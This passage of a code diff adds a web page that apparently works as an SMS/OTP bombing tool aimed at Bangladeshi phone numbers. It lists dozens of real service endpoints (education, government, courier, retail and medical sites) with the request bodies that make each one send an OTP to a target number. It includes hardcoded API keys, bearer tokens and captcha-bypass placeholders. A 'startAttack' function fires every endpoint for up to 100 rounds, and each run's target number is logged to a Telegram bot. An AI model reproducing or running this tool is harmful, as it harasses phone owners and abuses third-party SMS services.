+    { name:"Shikho SMS", url:"https://api.shikho.com/auth/v2/send/sms", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({auth_type:"signup",phone:"880"+p.replace(/^0/,""),vendor:"shikho",type:"student"}) },
+    { name:"Mojaru", url:"https://new.mojaru.com/api/student/login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile_or_email:p}) },
+    { name:"English Moja", url:"https://api.englishmojabd.com/api/v1/auth/login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:"+88"+p.replace(/^0/,"")}) },
+    { name:"Training Gov BD", url:"https://training.gov.bd/backoffice/api/user/sendOtp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile:p}) },
+    { name:"Quizgiri", url:"https://developer.quizgiri.xyz/api/v2.0/send-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({country_code:"+88",phone:p}) },
+    { name:"Sundarban Courier", url:"https://api-gateway.sundarbancourierltd.com/graphql", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({operationName:"CreateAccessToken",variables:{accessTokenFilter:{userName:p}},query:"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}"}) },
+    { name:"Walton Plaza", url:"https://waltonplaza.com.bd/api/auth/otp/create", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({auth:{countryCode:"880",deviceUuid:"ee757830-f639-12f0-9f4d-2f972746fhg",phone:p.replace(/^0/,"")},captchaToken:"recapcha"}) },
+    { name:"Apex4u", url:"https://api.apex4u.com/api/auth/login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:p}) },
+    { name:"BTCL", url:"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNbr:p,OTPType:1.0,userName:"",email:""}) },
+    { name:"Otithee", url:"https://gateway.otithee.com/api/v1/generate-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({request_type:"registration",mobile_number:p}) },
+    { name:"Garibook", url:"https://api.garibookadmin.com/api/v3/user/login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({recaptcha_token:"garibookcaptcha",mobile:p,channel:"web"}) },
+    { name:"Deepto Play", url:"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({number:"+88"+p.replace(/^0/,"")}) },
+    { name:"RedX", url:"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:p}) },
+    { name:"Timezone BD", url:"https://backend.timezonebd.com/api/v1/user/otp-login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p}) },
+    { name:"GP Shop", url:"https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p,language:"en",email:""}) },
+    { name:"Ostad", url:"https://api.ostad.app/api/v2/user/with-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({msisdn:p}) },
+    { name:"iEducation BD", url:"https://www.ieducationbd.com/api/account/check_user", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile:p}) },
+    { name:"Hishabee", url:"https://distribution.hishabee.business/api/app/v1/auth/number-check", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile_number:p}) },
+    { name:"Klassy BD", url:"https://api.klassy.com.bd/api/v2/public/user/register/send/otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p}) },
+    { name:"One Fish", url:"https://api.onefish.app/api/auth/user/sendotp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p}) },
+    { name:"Shomvob", url:"https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/", method:"POST", headers:{"Content-Type":"application/json","Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"}, getBody:(p)=>({phone:"880"+p.replace(/^0/,""),is_retry:0}) },
+    { name:"Osud Kini", url:"https://api.osudkini.com/api/otp/generate-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNo:p}) },
+    { name:"Chaldal", url:"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:"+880"+p.replace(/^0/,""),retryAttempt:0}) },
+    { name:"Khaas Food", url:"https://www.khaasfood.com/api/auth/request-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({username:p}) },
+    { name:"Meena Bazar", url:"https://meenabazardev.com/api/mobile/front/send/otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({CellPhone:p,type:"login"}) },
+    { name:"Bata BD", url:"https://www.batabd.com/apps/ez/api/GenerateOtp", method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, getBody:(p)=>({MobileNo:p.replace(/^0/,""),EmailId:"team@dangerous.com",StoreName:"batabd.myshopify.com",IP:"59.152.4.182",Token:"bypass_token",CountryCode:"880"}) },
+    { name:"Le Reve Craze", url:"https://www.lerevecraze.com/login/verify_phone", method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, getBody:(p)=>({mobile_no:p,resend:"0",recaptcha_token:"bypass"}) },
+    { name:"Focallure BD", url:"https://store.focallurebd.com/api/v1/1/ecom/auth/getCode", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile:p}) },
+    { name:"Khaodao", url:"https://api.eat-z.com/auth/customer/app-connect", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({username:"+88"+p.replace(/^0/,"")}) },
+    { name:"Quality Foods", url:"https://admin.qualityfoods.com.bd/api/auth/check-phone", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p,is_sign_in:0,login_type:"phone"}) },
+    { name:"Fundesh OTP", url:"https://fundesh.com.bd/api/auth/generateOTP?service_key=", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({msisdn:p.replace(/^0/,"")}) },
+    { name:"Practice Club", url:"https://www.practiceclub.net/api/register", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({contact_no:p}) },
+    { name:"ACS Future School", url:"https://auth.acsfutureschool.com/api/v1/otp/send", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p}) },
+    { name:"AWS POC", url:"https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p}) },
+    { name:"RedX Login", url:"https://api.redx.com.bd/v1/user/request-login-code", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({callingCode:"+880",phoneNumber:p.replace(/^0/,""),countryCode:"BD",service:"redx"}) },
+    { name:"Gorilla Move", url:"https://api.gorillamove.com/api/v1/core/account/phone_login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone_number:p,step:1}) },
+    { name:"Relaxy BD", url:"https://dev.api.relaxy.com.bd/api/v1/otp/send", method:"POST", headers:{"Content-Type":"application/json","x-api-key":"6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX"}, getBody:(p)=>({phoneNumber:"+880"+p.replace(/^0/,""),appSignature:"appSignature"}) },
+    { name:"BD Matrimony", method:"GET", getUrl:(p)=>`https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo=${p}` },
+    { name:"MyGuardian BD", url:"https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobileNumber:p,type:null}) },
+    { name:"Medico Bio", url:"https://api.v2.medico.bio/patient/passwordless-login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:p,deviceId:"45098c95a7fe4109cc5969a770ee846a",channel:"web",userType:"patient",type:"newUser"}) },
+    { name:"Amiprobashi", url:"https://www.amiprobashi.com/api/v7/en/auth/send-otp", method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, getBody:(p)=>({device_type:"1",username:"+88"+p.replace(/^0/,""),for:"1",type:"1",bd_number:"1"}) },
+    { name:"Bepari App", url:"https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({client_id:4,client_secret:"zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK",mobile_no:p}) },
+    { name:"ILYN Global", url:"https://api.ilyn.global/auth/signup", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:{code:"BD",number:p},provider:"sms"}) },
+    { name:"Rangs Motors", url:"https://api.rangsmotors.com/", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({u_num:p}) },
+    { name:"Walton Amar Awaz", url:"https://walton-amar-awaz-prod.com/api/user/signup", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({email:"",fbId:"",fullName:"User",gId:"",phone:p}) },
+    { name:"PBS BD", url:"https://pbs.com.bd/login/?handler=UserGetOtp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({UserName:"Teamdangerous",UserPassword:"Tushar",MobileNo:p}) },
+    { name:"PBS Alpha OTP", url:"https://apialpha.pbs.com.bd/api/OTP/generateOTP", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({userPhone:p,otp:""}) },
+    { name:"Pharmaid RX", url:"https://shop.pharmaid-rx.com/api/sendSMSRegistration", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobileNumber:p}) },
+    { name:"Wholesale Plus", url:"https://admin.wholesaleplus.com.bd/api/send-otp/", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({email:p,regi:true}) },
+    { name:"Motion View", url:"https://api.motionview.com.bd/api/send-otp-phone-signup", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p}) },
+    { name:"ExpressHub", url:"https://expresshub.com.bd/User/CreateNewUser", method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, getBody:(p)=>({_UID:p,_UNAME:"TeamDangerous",_MAIL:"team@dangerous.com",_PHONE:p,_PASS:"Tushar2021",_TYPE:"1"}) },
+    { name:"ABC Lit", url:"https://abclit.com/api/sendOTP", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({recipientNo:p,code:1234}) },
+    { name:"Beauty Booth", url:"https://admin.beautybooth.com.bd/api/v2/auth/register-new", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({signature:280,type:"phone",value:p,token:39}) },
+    { name:"WinBaji", url:"https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({Mobile:p,SiteCode:"WBJ"}) }
+];
+
+// ==========================================
+// API CALL FUNCTIONS
+// ==========================================
+const KAROBAR_API = {
+    url: "https://mybackend.karobarapp.com/api/v3/oauth/otp-request/",
+    getHeaders: () => ({ 
+        "Content-Type": "application/json", 
+        "User-Agent": ["Dart/3.6","Dart/3.5","okhttp/4.12.0"][Math.floor(Math.random()*3)] 
+    }),
+    getBody: (phone) => ({ phone_number: phone, country: "bd", os: "Android" })
+};
+
+async function callKarobarAPI(phone) {
+    try { 
+        const res = await fetch(KAROBAR_API.url, { 
+            method: "POST", 
+            headers: KAROBAR_API.getHeaders(), 
+            body: JSON.stringify(KAROBAR_API.getBody(phone)) 
+        }); 
+        return res.ok; 
+    } catch { return false; }
+}
+
+async function callAPI(api, phone) {
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 6000);
+        if (api.method === "GET") {
+            await fetch(api.getUrl(phone), { method: "GET", signal: controller.signal });
+        } else {
+            await fetch(api.url, { 
+                method: "POST", 
+                headers: api.headers || { "Content-Type": "application/json" }, 
+                body: JSON.stringify(api.getBody(phone)), 
+                signal: controller.signal 
+            });
+        }
+        clearTimeout(timeoutId);
+        return true;
+    } catch { return false; }
+}
+
+// ==========================================
+// TELEGRAM LOG
+// ==========================================
+async function sendTelegramLog(number, rounds, success, failed) {
+    const total = rounds * (APIS.length + 2);
+    const message = `🔰 *FIRE ON TARGET LOG* 🔰\n\n📱 *Target:* ${number}\n⚡ *Rounds:* ${rounds}\n✅ *Success:* ${success}\n❌ *Failed:* ${failed}\n📊 *Total:* ${total}\n\n🔥 *Developer:* Lucky Hera`;
+    try { 
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { 
+            method: "POST", 
+            headers: { "Content-Type": "application/json" }, 
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }) 
+        }); 
+    } catch(e) { console.error('Telegram error:', e); }
+}
+
+// ==========================================
+// MAIN ATTACK FUNCTION
+// ==========================================
+async function startAttack() {
+    let number = document.getElementById("number").value.trim();
+    let amount = parseInt(document.getElementById("amount").value);
+    
+    if (!number || !amount || amount <= 0) { 
+        alert("⚠️ সঠিক নাম্বার ও রাউন্ড দিন!"); 
+        return; 
+    }
+    if (amount > 100) {
+        alert("⚠️ সর্বোচ্চ ১০০ রাউন্ড পর্যন্ত দেওয়া যাবে!");
+        document.getElementById("amount").value = 100;
+        amount = 100;
+    }
+    
+    number = number.replace(/\s+/g, "");
+    if (!number.startsWith("0")) number = "0" + number;
+    
+    if (APIS.length === 0) {
+        alert("⚠️ কোনো API পাওয়া যায়নি! রিলোড করুন।");
+        return;
+    }
+    
+    const btn = document.getElementById("sendBtn");
+    btn.disabled = true;
+    window._attackRunning = true;
+    document.getElementById("btnText").textContent = "ATTACKING...";
+    document.getElementById("progressSection").style.display = "block";
+    
+    let success = 0, failed = 0;
+    
+    for (let round = 0; round < amount; round++) {
+        (await callKarobarAPI(number)) ? success++ : failed++;
+        const results = await Promise.all(APIS.map(api => callAPI(api, number)));
+        results.forEach(r => r ? success++ : failed++);
+        (await callKarobarAPI(number)) ? success++ : failed++;
+        
+        const totalCalls = (round + 1) * (APIS.length + 2);
+        const pct = ((round + 1) / amount * 100).toFixed(0);
+        
+        document.getElementById("progressFill").style.width = pct + "%";
+        document.getElementById("progressPercent").textContent = pct + "%";
+        document.getElementById("successCount").textContent = success;
+        document.getElementById("failCount").textContent = failed;
+        document.getElementById("totalCount").textContent = totalCalls;
+        
+        if (round < amount - 1) await new Promise(r => setTimeout(r, 400));
+    }
+    
+    btn.disabled = false;
+    window._attackRunning = false;
+    document.getElementById("btnText").textContent = "START ATTACK";
+    
+    try {
+        await sendTelegramLog(number, amount, success, failed);
+    } catch(e) { console.error("Log save error:", e); }
+}
+
+// ==========================================
+// INPUT VALIDATION
+// ==========================================
+document.getElementById("number").addEventListener("input", function(e) {
+    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 11);
+});
+
+// ==========================================
+// WINDOW ONLOAD
+// ==========================================
+window.onload = function() {
+    document.getElementById('apiCountText').textContent = APIS.length + '+ APIs Active';
+    console.log('🚀 System Ready! Total APIs:', APIS.length);
+};
+</script>
+
+</body>
+</html>
